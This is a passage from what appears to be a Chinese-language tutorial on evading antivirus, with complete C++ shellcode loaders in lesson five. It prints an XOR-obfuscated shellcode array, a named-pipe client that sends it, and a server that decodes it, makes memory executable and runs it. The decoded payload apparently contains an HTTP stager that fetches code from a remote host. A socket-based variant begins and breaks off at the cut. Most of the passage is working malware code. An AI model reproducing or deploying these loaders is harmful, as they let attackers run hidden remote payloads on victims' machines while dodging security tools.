class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;intrin.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFF_SIZE 1024</span></span><br><span class="line"><span class="keyword">char</span> buf[] = <span class="string">&quot;\xf6\xe2\x83\x0a\x0a\x0a\x6a\x83\xef\x3b\xd8\x6e\x81\x58\x3a\x81\x58\x06\x81\x58\x1e\x81\x78\x22\x05\xbd\x40\x2c\x3b\xf5\x3b\xca\xa6\x36\x6b\x76\x08\x26\x2a\xcb\xc5\x07\x0b\xcd\xe8\xfa\x58\x5d\x81\x58\x1a\x81\x48\x36\x0b\xda\x81\x4a\x72\x8f\xca\x7e\x40\x0b\xda\x5a\x81\x42\x12\x81\x52\x2a\x0b\xd9\xe9\x36\x43\x81\x3e\x81\x0b\xdc\x3b\xf5\x3b\xca\xa6\xcb\xc5\x07\x0b\xcd\x32\xea\x7f\xfe\x09\x77\xf2\x31\x77\x2e\x7f\xe8\x52\x81\x52\x2e\x0b\xd9\x6c\x81\x06\x41\x81\x52\x16\x0b\xd9\x81\x0e\x81\x0b\xda\x83\x4e\x2e\x2e\x51\x51\x6b\x53\x50\x5b\xf5\xea\x52\x55\x50\x81\x18\xe1\x8c\x57\x62\x64\x6f\x7e\x0a\x62\x7d\x63\x64\x63\x5e\x62\x46\x7d\x2c\x0d\xf5\xdf\x3b\xf5\x5d\x5d\x5d\x5d\x5d\x62\x30\x5c\x73\xad\xf5\xdf\xe3\x8e\x0a\x0a\x0a\x51\x3b\xc3\x5b\x5b\x60\x09\x5b\x5b\x62\x9a\x15\x0a\x0a\x59\x5a\x62\x5d\x83\x95\xcc\xf5\xdf\xe1\x7a\x51\x3b\xd8\x58\x62\x0a\x08\x6a\x8e\x58\x58\x58\x59\x58\x5a\x62\xe1\x5f\x24\x31\xf5\xdf\x83\xcc\x89\xc9\x5a\x3b\xf5\x5d\x5d\x60\xf5\x59\x5c\x62\x27\x0c\x12\x71\xf5\xdf\x8f\xca\x05\x8e\xc9\x0b\x0a\x0a\x3b\xf5\x8f\xfc\x7e\x0e\x83\xf3\xe1\x03\x62\xa0\xcf\xe8\x57\xf5\xdf\x83\xcb\x62\x4f\x2b\x54\x3b\xf5\xdf\x3b\xf5\x5d\x60\x0d\x5b\x5c\x5a\x62\xbd\x5d\xea\x01\xf5\xdf\xb5\x0a\x25\x0a\x0a\x33\xcd\x7e\xbd\x3b\xf5\xe3\x9b\x0b\x0a\x0a\xe3\xc3\x0b\x0a\x0a\xe2\x81\xf5\xf5\xf5\x25\x39\x7f\x65\x4f\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x0a\x5f\x79\x6f\x78\x27\x4b\x6d\x6f\x64\x7e\x30\x2a\x47\x65\x70\x63\x66\x66\x6b\x25\x3f\x24\x3a\x2a\x22\x69\x65\x67\x7a\x6b\x7e\x63\x68\x66\x6f\x31\x2a\x47\x59\x43\x4f\x2a\x33\x24\x3a\x31\x2a\x5d\x63\x64\x6e\x65\x7d\x79\x2a\x44\x5e\x2a\x3c\x24\x3b\x31\x2a\x5e\x78\x63\x6e\x6f\x64\x7e\x25\x3f\x24\x3a\x31\x2a\x48\x45\x43\x4f\x33\x31\x44\x46\x44\x46\x23\x07\x00\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x0a\x62\xfa\xbf\xa8\x5c\xf5\xdf\x60\x4a\x62\x0a\x1a\x0a\x0a\x62\x0a\x0a\x4a\x0a\x5d\x62\x52\xae\x59\xef\xf5\xdf\x99\xb3\x0a\x0a\x0a\x0a\x0b\xd3\x5b\x59\x83\xed\x5d\x62\x0a\x2a\x0a\x0a\x59\x5c\x62\x18\x9c\x83\xe8\xf5\xdf\x8f\xca\x7e\xcc\x81\x0d\x0b\xc9\x8f\xca\x7f\xef\x52\xc9\xe2\xa3\xf7\xf5\xf5\x3b\x33\x38\x24\x3b\x3c\x32\x24\x3b\x3d\x3a\x24\x3b\x38\x32\x0a\x0a\x0a\x0a\x0a&quot;</span>;</span><br><span class="line">PTCHAR ptsPipeName = TEXT(<span class="string">&quot;\.\pipe\BadCodeTest&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">RecvShellcode</span><span class="params">(VOID)</span></span>&#123;</span><br><span class="line">    HANDLE hPipeClient;</span><br><span class="line">    DWORD dwWritten;</span><br><span class="line">    DWORD dwShellcodeSize = <span class="keyword">sizeof</span>(buf);</span><br><span class="line">    <span class="comment">// 等待管道可用</span></span><br><span class="line">    WaitNamedPipe(ptsPipeName,NMPWAIT_WAIT_FOREVER);</span><br><span class="line">    <span class="comment">// 连接管道</span></span><br><span class="line">    hPipeClient = CreateFile(ptsPipeName,GENERIC_WRITE,FILE_SHARE_READ,<span class="literal">NULL</span>,OPEN_EXISTING ,FILE_ATTRIBUTE_NORMAL,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(hPipeClient == INVALID_HANDLE_VALUE)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+]Can&#x27;t Open Pipe , Error : %d \n&quot;</span>,GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    WriteFile(hPipeClient,buf,dwShellcodeSize,&amp;dwWritten,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span>(dwWritten == dwShellcodeSize)&#123;</span><br><span class="line">        CloseHandle(hPipeClient);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+]Send Success ! Shellcode : %d Bytes\n&quot;</span>,dwShellcodeSize);</span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">    CloseHandle(hPipeClient);</span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wmain</span><span class="params">(<span class="keyword">int</span> argc, TCHAR * argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    HANDLE hPipe;</span><br><span class="line">    DWORD dwError;</span><br><span class="line">    CHAR szBuffer[BUFF_SIZE];</span><br><span class="line">    DWORD dwLen;</span><br><span class="line">    PCHAR pszShellcode = <span class="literal">NULL</span>;</span><br><span class="line">    DWORD dwOldProtect; <span class="comment">// 内存页属性</span></span><br><span class="line">    HANDLE hThread;</span><br><span class="line">    DWORD dwThreadId;</span><br><span class="line">    <span class="comment">// 参考：https://docs.microsoft.com/zh-cn/windows/win32/api/winbase/nf-winbase-createnamedpipea</span></span><br><span class="line">    hPipe = CreateNamedPipe(</span><br><span class="line">        ptsPipeName,</span><br><span class="line">        PIPE_ACCESS_INBOUND,</span><br><span class="line">        PIPE_TYPE_BYTE| PIPE_WAIT,</span><br><span class="line">        PIPE_UNLIMITED_INSTANCES,</span><br><span class="line">        BUFF_SIZE,</span><br><span class="line">        BUFF_SIZE,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(hPipe == INVALID_HANDLE_VALUE)&#123;</span><br><span class="line">        dwError = GetLastError();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-]Create Pipe Error : %d \n&quot;</span>,dwError);</span><br><span class="line">        <span class="keyword">return</span> dwError;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    CreateThread(<span class="literal">NULL</span>,<span class="literal">NULL</span>,(LPTHREAD_START_ROUTINE)RecvShellcode,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(ConnectNamedPipe(hPipe,<span class="literal">NULL</span>) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+]Client Connected...\n&quot;</span>);</span><br><span class="line">        ReadFile(hPipe,szBuffer,BUFF_SIZE,&amp;dwLen,<span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+]Get DATA Length : %d \n&quot;</span>,dwLen);</span><br><span class="line">        <span class="comment">// 申请内存页</span></span><br><span class="line">        pszShellcode = (PCHAR)VirtualAlloc(<span class="literal">NULL</span>,dwLen,MEM_COMMIT,PAGE_READWRITE);</span><br><span class="line">        <span class="comment">// 拷贝内存</span></span><br><span class="line">        CopyMemory(pszShellcode,szBuffer,dwLen);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(DWORD i = <span class="number">0</span>;i&lt; dwLen; i++)&#123;</span><br><span class="line">            Sleep(<span class="number">50</span>);</span><br><span class="line">            _InterlockedXor8(pszShellcode+i,<span class="number">10</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 这里开始更改它的属性为可执行</span></span><br><span class="line">        VirtualProtect(pszShellcode,dwLen,PAGE_EXECUTE,&amp;dwOldProtect);</span><br><span class="line">        <span class="comment">// 执行Shellcode</span></span><br><span class="line">        hThread = CreateThread(</span><br><span class="line">            <span class="literal">NULL</span>, <span class="comment">// 安全描述符</span></span><br><span class="line">            <span class="literal">NULL</span>, <span class="comment">// 栈的大小</span></span><br><span class="line">            (LPTHREAD_START_ROUTINE)pszShellcode, <span class="comment">// 函数</span></span><br><span class="line">            <span class="literal">NULL</span>, <span class="comment">// 参数</span></span><br><span class="line">            <span class="literal">NULL</span>, <span class="comment">// 线程标志</span></span><br><span class="line">            &amp;dwThreadId <span class="comment">// 线程ID</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        WaitForSingleObject(hThread,INFINITE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过一个线程函数充当一个管道客户端，使用管道客户端连接管道，发送Shellcode，然后由管道服务端接收，并反混淆，运行木马线程。</p><h1 id="第五课"><a href="#第五课" class="headerlink" title="第五课"></a>第五课</h1><h2 id="真正意义的分离"><a href="#真正意义的分离" class="headerlink" title="真正意义的分离"></a>真正意义的分离</h2><p>将上一课的代码分离开编译，然后通过管道传输，让进程通信。</p><p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/61c9d3f728cda70fab2d1905d018df9f.png"></p><p><strong>BadCodeWithPipe</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;intrin.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFF_SIZE 1024</span></span><br><span class="line"></span><br><span class="line">PTCHAR ptsPipeName = TEXT(<span class="string">&quot;\.\pipe\BadCodeTest&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wmain</span><span class="params">(<span class="keyword">int</span> argc, TCHAR * argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    HANDLE hPipe;</span><br><span class="line">    DWORD dwError;</span><br><span class="line">    CHAR szBuffer[BUFF_SIZE];</span><br><span class="line">    DWORD dwLen;</span><br><span class="line">    PCHAR pszShellcode = <span class="literal">NULL</span>;</span><br><span class="line">    DWORD dwOldProtect; <span class="comment">// 内存页属性</span></span><br><span class="line">    HANDLE hThread;</span><br><span class="line">    DWORD dwThreadId;</span><br><span class="line">    <span class="comment">// 参考：https://docs.microsoft.com/zh-cn/windows/win32/api/winbase/nf-winbase-createnamedpipea</span></span><br><span class="line">    hPipe = CreateNamedPipe(</span><br><span class="line">        ptsPipeName,</span><br><span class="line">        PIPE_ACCESS_INBOUND,</span><br><span class="line">        PIPE_TYPE_BYTE| PIPE_WAIT,</span><br><span class="line">        PIPE_UNLIMITED_INSTANCES,</span><br><span class="line">        BUFF_SIZE,</span><br><span class="line">        BUFF_SIZE,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(hPipe == INVALID_HANDLE_VALUE)&#123;</span><br><span class="line">        dwError = GetLastError();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-]Create Pipe Error : %d \n&quot;</span>,dwError);</span><br><span class="line">        <span class="keyword">return</span> dwError;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(ConnectNamedPipe(hPipe,<span class="literal">NULL</span>) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+]Client Connected...\n&quot;</span>);</span><br><span class="line">        ReadFile(hPipe,szBuffer,BUFF_SIZE,&amp;dwLen,<span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+]Get DATA Length : %d \n&quot;</span>,dwLen);</span><br><span class="line">        <span class="comment">// 申请内存页</span></span><br><span class="line">        pszShellcode = (PCHAR)VirtualAlloc(<span class="literal">NULL</span>,dwLen,MEM_COMMIT,PAGE_READWRITE);</span><br><span class="line">        <span class="comment">// 拷贝内存</span></span><br><span class="line">        CopyMemory(pszShellcode,szBuffer,dwLen);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(DWORD i = <span class="number">0</span>;i&lt; dwLen; i++)&#123;</span><br><span class="line">            Sleep(<span class="number">50</span>);</span><br><span class="line">            _InterlockedXor8(pszShellcode+i,<span class="number">10</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 这里开始更改它的属性为可执行</span></span><br><span class="line">        VirtualProtect(pszShellcode,dwLen,PAGE_EXECUTE,&amp;dwOldProtect);</span><br><span class="line">        <span class="comment">// 执行Shellcode</span></span><br><span class="line">        hThread = CreateThread(</span><br><span class="line">            <span class="literal">NULL</span>, <span class="comment">// 安全描述符</span></span><br><span class="line">            <span class="literal">NULL</span>, <span class="comment">// 栈的大小</span></span><br><span class="line">            (LPTHREAD_START_ROUTINE)pszShellcode, <span class="comment">// 函数</span></span><br><span class="line">            <span class="literal">NULL</span>, <span class="comment">// 参数</span></span><br><span class="line">            <span class="literal">NULL</span>, <span class="comment">// 线程标志</span></span><br><span class="line">            &amp;dwThreadId <span class="comment">// 线程ID</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        WaitForSingleObject(hThread,INFINITE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>BadCodePipeClient</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;intrin.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFF_SIZE 1024</span></span><br><span class="line"><span class="keyword">char</span> buf[] = <span class="string">&quot;\xf6\xe2\x83\x0a\x0a\x0a\x6a\x83\xef\x3b\xd8\x6e\x81\x58\x3a\x81\x58\x06\x81\x58\x1e\x81\x78\x22\x05\xbd\x40\x2c\x3b\xf5\x3b\xca\xa6\x36\x6b\x76\x08\x26\x2a\xcb\xc5\x07\x0b\xcd\xe8\xfa\x58\x5d\x81\x58\x1a\x81\x48\x36\x0b\xda\x81\x4a\x72\x8f\xca\x7e\x40\x0b\xda\x5a\x81\x42\x12\x81\x52\x2a\x0b\xd9\xe9\x36\x43\x81\x3e\x81\x0b\xdc\x3b\xf5\x3b\xca\xa6\xcb\xc5\x07\x0b\xcd\x32\xea\x7f\xfe\x09\x77\xf2\x31\x77\x2e\x7f\xe8\x52\x81\x52\x2e\x0b\xd9\x6c\x81\x06\x41\x81\x52\x16\x0b\xd9\x81\x0e\x81\x0b\xda\x83\x4e\x2e\x2e\x51\x51\x6b\x53\x50\x5b\xf5\xea\x52\x55\x50\x81\x18\xe1\x8c\x57\x62\x64\x6f\x7e\x0a\x62\x7d\x63\x64\x63\x5e\x62\x46\x7d\x2c\x0d\xf5\xdf\x3b\xf5\x5d\x5d\x5d\x5d\x5d\x62\x30\x5c\x73\xad\xf5\xdf\xe3\x8e\x0a\x0a\x0a\x51\x3b\xc3\x5b\x5b\x60\x09\x5b\x5b\x62\x9a\x15\x0a\x0a\x59\x5a\x62\x5d\x83\x95\xcc\xf5\xdf\xe1\x7a\x51\x3b\xd8\x58\x62\x0a\x08\x6a\x8e\x58\x58\x58\x59\x58\x5a\x62\xe1\x5f\x24\x31\xf5\xdf\x83\xcc\x89\xc9\x5a\x3b\xf5\x5d\x5d\x60\xf5\x59\x5c\x62\x27\x0c\x12\x71\xf5\xdf\x8f\xca\x05\x8e\xc9\x0b\x0a\x0a\x3b\xf5\x8f\xfc\x7e\x0e\x83\xf3\xe1\x03\x62\xa0\xcf\xe8\x57\xf5\xdf\x83\xcb\x62\x4f\x2b\x54\x3b\xf5\xdf\x3b\xf5\x5d\x60\x0d\x5b\x5c\x5a\x62\xbd\x5d\xea\x01\xf5\xdf\xb5\x0a\x25\x0a\x0a\x33\xcd\x7e\xbd\x3b\xf5\xe3\x9b\x0b\x0a\x0a\xe3\xc3\x0b\x0a\x0a\xe2\x81\xf5\xf5\xf5\x25\x39\x7f\x65\x4f\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x0a\x5f\x79\x6f\x78\x27\x4b\x6d\x6f\x64\x7e\x30\x2a\x47\x65\x70\x63\x66\x66\x6b\x25\x3f\x24\x3a\x2a\x22\x69\x65\x67\x7a\x6b\x7e\x63\x68\x66\x6f\x31\x2a\x47\x59\x43\x4f\x2a\x33\x24\x3a\x31\x2a\x5d\x63\x64\x6e\x65\x7d\x79\x2a\x44\x5e\x2a\x3c\x24\x3b\x31\x2a\x5e\x78\x63\x6e\x6f\x64\x7e\x25\x3f\x24\x3a\x31\x2a\x48\x45\x43\x4f\x33\x31\x44\x46\x44\x46\x23\x07\x00\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x0a\x62\xfa\xbf\xa8\x5c\xf5\xdf\x60\x4a\x62\x0a\x1a\x0a\x0a\x62\x0a\x0a\x4a\x0a\x5d\x62\x52\xae\x59\xef\xf5\xdf\x99\xb3\x0a\x0a\x0a\x0a\x0b\xd3\x5b\x59\x83\xed\x5d\x62\x0a\x2a\x0a\x0a\x59\x5c\x62\x18\x9c\x83\xe8\xf5\xdf\x8f\xca\x7e\xcc\x81\x0d\x0b\xc9\x8f\xca\x7f\xef\x52\xc9\xe2\xa3\xf7\xf5\xf5\x3b\x33\x38\x24\x3b\x3c\x32\x24\x3b\x3d\x3a\x24\x3b\x38\x32\x0a\x0a\x0a\x0a\x0a&quot;</span>;</span><br><span class="line">PTCHAR ptsPipeName = TEXT(<span class="string">&quot;\.\pipe\BadCodeTest&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">RecvShellcode</span><span class="params">(VOID)</span></span>&#123;</span><br><span class="line">    HANDLE hPipeClient;</span><br><span class="line">    DWORD dwWritten;</span><br><span class="line">    DWORD dwShellcodeSize = <span class="keyword">sizeof</span>(buf);</span><br><span class="line">    <span class="comment">// 等待管道可用</span></span><br><span class="line">    WaitNamedPipe(ptsPipeName,NMPWAIT_WAIT_FOREVER);</span><br><span class="line">    <span class="comment">// 连接管道</span></span><br><span class="line">    hPipeClient = CreateFile(ptsPipeName,GENERIC_WRITE,FILE_SHARE_READ,<span class="literal">NULL</span>,OPEN_EXISTING ,FILE_ATTRIBUTE_NORMAL,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(hPipeClient == INVALID_HANDLE_VALUE)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+]Can&#x27;t Open Pipe , Error : %d \n&quot;</span>,GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    WriteFile(hPipeClient,buf,dwShellcodeSize,&amp;dwWritten,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span>(dwWritten == dwShellcodeSize)&#123;</span><br><span class="line">        CloseHandle(hPipeClient);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+]Send Success ! Shellcode : %d Bytes\n&quot;</span>,dwShellcodeSize);</span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">    CloseHandle(hPipeClient);</span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wmain</span><span class="params">(<span class="keyword">int</span> argc, TCHAR * argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    RecvShellcode();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="网络套接字（socket）"><a href="#网络套接字（socket）" class="headerlink" title="网络套接字（socket）"></a>网络套接字（socket）</h2><p>通过建立一个客户端和服务端，进行Shellcode的收发，类似于Java中的反序列化。</p><p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/1a40f881fa1acfbe75f302bfff33a013.png"></p><p>Server:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 